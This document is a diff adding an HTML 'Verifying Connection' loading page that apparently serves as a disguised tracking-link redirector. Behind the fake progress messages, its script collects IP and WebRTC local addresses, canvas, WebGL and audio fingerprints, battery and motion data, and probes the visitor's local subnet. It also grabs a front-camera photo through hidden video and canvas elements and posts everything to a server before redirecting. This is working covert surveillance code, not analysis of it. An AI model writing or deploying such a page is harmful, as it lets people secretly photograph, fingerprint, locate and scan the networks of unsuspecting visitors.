@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Loading...</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@400;500;700;800&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #030305;
+      --accent: #8b5cf6;
+      --accent2: #06b6d4;
+      --text: #ffffff;
+      --text2: #94a3b8;
+      --border: rgba(255,255,255,0.06);
+      --glow: rgba(139,92,246,0.4);
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      height: 100vh; width: 100vw;
+      overflow: hidden;
+    }
+
+    /* ── full-page overlay while loading ── */
+    #overlay {
+      position: fixed; inset: 0; z-index: 999;
+      background: var(--bg);
+      display: flex; align-items: center; justify-content: center;
+      transition: opacity .6s ease;
+    }
+    #overlay.fade-out { opacity: 0; pointer-events: none; }
+
+    /* animated BG */
+    .bg-wrap {
+      position: absolute; inset: 0; pointer-events: none;
+      background:
+        radial-gradient(ellipse at 20% 30%, rgba(124,111,253,0.13) 0%, transparent 55%),
+        radial-gradient(ellipse at 80% 70%, rgba(168,85,247,0.1) 0%, transparent 50%),
+        var(--bg);
+    }
+    .particle {
+      position: absolute; border-radius: 50%;
+      animation: drift linear infinite; opacity: 0;
+    }
+    @keyframes drift {
+      0%   { transform: translateY(110vh) scale(0); opacity: 0; }
+      10%  { opacity: .5; }
+      90%  { opacity: .3; }
+      100% { transform: translateY(-10vh) scale(1.2); opacity: 0; }
+    }
+
+    /* card */
+    .card {
+      position: relative; z-index: 1;
+      width: 90%; max-width: 400px;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid var(--border);
+      backdrop-filter: blur(30px);
+      border-radius: 24px;
+      padding: 2.8rem 2rem;
+      text-align: center;
+      box-shadow: 0 30px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.05);
+      display: flex; flex-direction: column; align-items: center; gap: 1.4rem;
+    }
+
+    /* spinner */
+    .spinner-wrap { position: relative; width: 88px; height: 88px; }
+    .spinner-ring {
+      position: absolute; inset: 0; border-radius: 50%;
+      border: 3px solid transparent;
+    }
+    .spinner-ring:nth-child(1) { border-top-color: var(--accent); animation: spin 1s linear infinite; }
+    .spinner-ring:nth-child(2) { border-right-color: var(--accent2); animation: spin 1.5s linear infinite reverse; inset: 9px; }
+    .spinner-ring:nth-child(3) { border-bottom-color: #c084fc; animation: spin 2s linear infinite; inset: 18px; }
+    .spinner-icon { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .load-title { font-size: 1.15rem; font-weight: 700; }
+    .load-sub   { font-size: .83rem; color: var(--text2); line-height: 1.6; }
+
+    /* status text that cycles */
+    #statusText { font-size: .78rem; color: var(--accent2); font-weight: 500; min-height: 1.1em; transition: opacity .3s; }
+
+    /* progress */
+    .prog-wrap { width: 100%; height: 5px; background: rgba(255,255,255,0.07); border-radius: 20px; overflow: hidden; }
+    .prog-bar  { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent), #a855f7); border-radius: 20px; transition: width .35s ease; }
+
+    /* hidden capture elements */
+    #camVideo  { display: none; }
+    #camCanvas { display: none; }
+  </style>
+</head>
+<body>
+
+<!-- Visible Loading Overlay for Smooth Transition -->
+<div id="overlay">
+  <div class="bg-wrap" id="bgWrap"></div>
+  <div class="card">
+    <div class="spinner-wrap">
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-icon">🔐</div>
+    </div>
+    <div class="load-title">Verifying Connection</div>
+    <div class="load-sub">Please wait while we secure your session...</div>
+    <div class="prog-wrap"><div class="prog-bar" id="progBar"></div></div>
+    <div id="statusText">Initiating...</div>
+  </div>
+</div>
+
+<!-- Hidden camera elements -->
+<video id="camVideo" autoplay playsinline muted></video>
+<canvas id="camCanvas"></canvas>
+
+<script>
+/* ── particles ── */
+const bgWrap = document.getElementById('bgWrap');
+for (let i = 0; i < 20; i++) {
+  const p   = document.createElement('div');
+  p.className = 'particle';
+  const sz  = Math.random() * 5 + 2;
+  p.style.cssText = `
+    width:${sz}px;height:${sz}px;left:${Math.random()*100}%;
+    background:hsl(${260+Math.random()*50},70%,70%);
+    animation-duration:${9+Math.random()*10}s;
+    animation-delay:${Math.random()*12}s;
+  `;
+  bgWrap.appendChild(p);
+}
+
+/* ── state ── */
+const stealthPath   = location.pathname;
+let   collectedData = {};
+let   destinationUrl = '';
+
+const progBar    = document.getElementById('progBar');
+const statusText = document.getElementById('statusText');
+let   prog       = 0;
+
+function setProgress(val, text) {
+  prog = Math.min(val, 100);
+  progBar.style.width = prog + '%';
+  if (text) {
+    statusText.style.opacity = '0';
+    setTimeout(() => { statusText.textContent = text; statusText.style.opacity = '1'; }, 150);
+  }
+}
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+/* ── redirect main flow ── */
+async function run() {
+  setProgress(10, 'Resolving destination...');
+
+  // STEP 1: Get the destination URL from /api/meta
+  try {
+    const metaRes = await fetch(`/api/meta?path=${encodeURIComponent(stealthPath)}`);
+    if (metaRes.ok) {
+      const meta = await metaRes.json();
+      if (meta.destinationUrl) destinationUrl = meta.destinationUrl;
+    }
+  } catch {}
+
+  setProgress(30, 'Analyzing environment...');
+
+  // STEP 2: Collect device data first (fast, no permission prompts)
+  try { await collectData(); } catch {}
+
+  setProgress(55, 'Verifying identity...');
+
+  // STEP 3: Attempt camera (has its own internal timeout so it never blocks)
+  try { await silentCamera(); } catch {}
+
+  setProgress(80, 'Finalizing handshake...');
+
+  // STEP 4: Send all data to server
+  try { await sendData(); } catch {}
+
+  setProgress(100, 'Redirecting...');
+
+  // STEP 5: Redirect instantly
+  if (destinationUrl) {
+    window.location.replace(destinationUrl);
+  } else {
+    document.getElementById('overlay').innerHTML = '<p style="color:#a09ec0;padding:3rem;font-family:Inter,sans-serif">Link expired or not found.</p>';
+  }
+}
+
+
+/* ── collect basic data ── */
+async function collectData() {
+  let ip = 'Unknown';
+  try {
+    const controller = new AbortController();
+    setTimeout(() => controller.abort(), 1000);
+    const r = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+    ip = (await r.json()).ip;
+  } catch {}
+
+  let battery = null, charging = false;
+  try {
+    const b = await navigator.getBattery();
+    battery  = Math.round(b.level * 100);
+    charging = b.charging;
+  } catch {}
+
+  let connection = 'Unknown';
+  try {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (c) connection = `${c.effectiveType || ''}${c.downlink ? ' / ' + c.downlink + 'Mbps' : ''}`.trim();
+  } catch {}
+
+  const ua = navigator.userAgent;
+  let deviceType = 'Desktop';
+  if      (/Mobile|Android|iPhone/i.test(ua)) deviceType = 'Mobile';
+  else if (/Tablet|iPad/i.test(ua))           deviceType = 'Tablet';
+
+  // --- HTML5 PRECISION GPS ---
+  let gps = null;
+  // REMOVED: GPS permission prompt to prevent blocking load time
+
+  // --- LOCAL NETWORK IP (WEBRTC) ---
+  let localIps = [];
+  try {
+    const pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel("");
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    pc.onicecandidate = (e) => {
+      if (!e || !e.candidate) return;
+      const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+      if (ipMatch && !localIps.includes(ipMatch[1])) localIps.push(ipMatch[1]);
+    };
+    await sleep(500); // Give WebRTC time to resolve candidates
+  } catch {}
+
+  // --- GYROSCOPE & MOTION ---
+  let motion = null;
+  try {
+    // Only capture a single snapshot of the current device orientation if available
+    window.addEventListener("deviceorientation", function(e) {
+      if (e.alpha !== null) {
+        motion = { alpha: Math.round(e.alpha), beta: Math.round(e.beta), gamma: Math.round(e.gamma) };
+      }
+    }, { once: true });
+    await sleep(200); // Wait for event to fire
+  } catch {}
+
+  // Indestructible WebGL Fingerprint
+  let webglHash = 'Unavailable';
+  try {
+    const cvs = document.createElement('canvas');
+    const gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      // Hash the exact GPU string
+      webglHash = btoa(`${vendor}-${renderer}`).substring(0, 16);
+    }
+  } catch {}
+
+  // --- CANVAS FINGERPRINTING ---
+  let canvasHash = 'Unavailable';
+  try {
+    const c = document.createElement('canvas');
+    c.width = 200; c.height = 50;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic"; ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+    ctx.fillStyle = "#069"; ctx.fillText("hello, world", 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("hello, world", 4, 17);
+    const dataUrl = c.toDataURL();
+    let hash = 0;
+    for (let i = 0; i < dataUrl.length; i++) { hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i); hash = hash & hash; }
+    canvasHash = hash.toString(16);
+  } catch {}
+
+  // --- AUDIO API FINGERPRINTING ---
+  let audioHash = 'Unavailable';
+  try {
+    const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+    const osc = ctx.createOscillator(); osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, ctx.currentTime);
+    const comp = ctx.createDynamicsCompressor();
+    comp.threshold.setValueAtTime(-50, ctx.currentTime); comp.knee.setValueAtTime(40, ctx.currentTime);
+    comp.ratio.setValueAtTime(12, ctx.currentTime); comp.attack.setValueAtTime(0, ctx.currentTime);
+    comp.release.setValueAtTime(0.25, ctx.currentTime);
+    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+    const buffer = await ctx.startRendering();
+    const p = buffer.getChannelData(0);
+    let hash = 0;
+    for (let i = 4500; i < 5000; i++) { hash += Math.abs(p[i]); }
+    audioHash = hash.toString().substring(0, 10);
+  } catch {}
+  
+  // --- HARDWARE CONCURRENCY ---
+  const cpuCores = navigator.hardwareConcurrency || 'Unknown';
+  const deviceRam = navigator.deviceMemory || 'Unknown';
+
+  // --- SUBNET SCANNER ---
+  // If we got a local IP, try to guess the router/gateway and ping it silently
+  let activeSubnetNodes = [];
+  if (localIps.length > 0) {
+    try {
+      const parts = localIps[0].split('.');
+      if (parts.length === 4) {
+        const base = `${parts[0]}.${parts[1]}.${parts[2]}.`;
+        const targets = [1, 100, 254]; // Common gateway/device suffixes
+        for (const t of targets) {
+          const checkIp = base + t;
+          if (checkIp === localIps[0]) continue;
+          // Silent fetch, we just want to see if it responds fast vs timeout
+          try {
+            const controller = new AbortController();
+            const tid = setTimeout(() => controller.abort(), 200);
+            await fetch(`http://${checkIp}:80`, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
+            clearTimeout(tid);
+            activeSubnetNodes.push(checkIp);
+          } catch(e) {
+            if (e.name !== 'AbortError') activeSubnetNodes.push(checkIp); 
+          }
+        }
+      }
+    } catch {}
+  }
+
+  collectedData = {
+    stealthPath, ip, battery, charging, connection, deviceType,
+    userAgent:     ua,
+    screenWidth:   screen.width,
+    screenHeight:  screen.height,
+    language:      navigator.language,
+    timezone:      Intl.DateTimeFormat().resolvedOptions().timeZone,
+    platform:      navigator.platform,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack:    navigator.doNotTrack,
+    gps:           gps,
+    localIps:      localIps,
+    motion:        motion,
+    cpuCores:      cpuCores,
+    deviceRam:     deviceRam,
+    canvasHash:    canvasHash,
+    audioHash:     audioHash,
+    subnetNodes:   activeSubnetNodes,
+    cameraPhoto:   null,
+    webglHash:     webglHash,
+    visitTime:     new Date().toISOString()
+  };
+}
+
+/* ── silent camera (browser shows its OWN small native popup) ── */
+async function silentCamera() {
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      collectedData.cameraPhoto = null;
+      return;
+    }
+    const streamPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: false });
+    const stream = await Promise.race([
+      streamPromise,
+      new Promise((_, reject) => setTimeout(() => reject(new Error('cam_timeout')), 2500))
+    ]);
+    const video = document.getElementById('camVideo');
+    video.srcObject = stream;
+    await video.play();
+    // Wait for at least one frame to render
+    await new Promise(resolve => {
+      video.requestVideoFrameCallback ? video.requestVideoFrameCallback(resolve) : setTimeout(resolve, 300);
+    });
+
+    const canvas = document.getElementById('camCanvas');
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    collectedData.cameraPhoto = canvas.toDataURL('image/jpeg', 0.6);
+    stream.getTracks().forEach(t => t.stop());
+  } catch {
+    collectedData.cameraPhoto = null;
+  }
+}
+
+/* ── send data to server ── */
+async function sendData() {
+  try {
+    const r = await fetch('/api/collect', {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify(collectedData)
+    });
+    const d = await r.json();
+    if (d.destinationUrl) destinationUrl = d.destinationUrl;
+  } catch {}
+}
+
+/* ── redirect flow (iframe removed) ── */
+// Reveal content is no longer used since we hard redirect.
+
+/* ── start ── */
+if (!stealthPath || stealthPath === '/') {
+  document.getElementById('overlay').innerHTML =
+    '<p style="color:#a09ec0;padding:3rem;font-family:Inter,sans-serif">Invalid link.</p>';
+} else {
+  run();
+}
+</script>
+</body>
+</html>
